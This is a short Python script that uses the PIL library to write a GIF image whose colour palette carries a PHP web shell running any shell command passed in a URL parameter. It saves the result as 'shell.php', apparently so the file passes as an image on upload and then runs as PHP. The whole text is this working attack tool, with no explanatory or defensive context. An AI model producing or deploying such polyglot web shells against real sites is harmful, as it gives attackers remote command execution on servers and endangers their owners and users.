from PIL import Image

payload = b'<?php system($_GET["c"]);?>'

n = len(payload) // 3

img = Image.new('P', (n, 1))
palette = list(payload) + [0, 0, 0] * (256 - n)
img.putpalette(palette)
img.putdata(list(range(n)))
img.save('shell.php', format='GIF')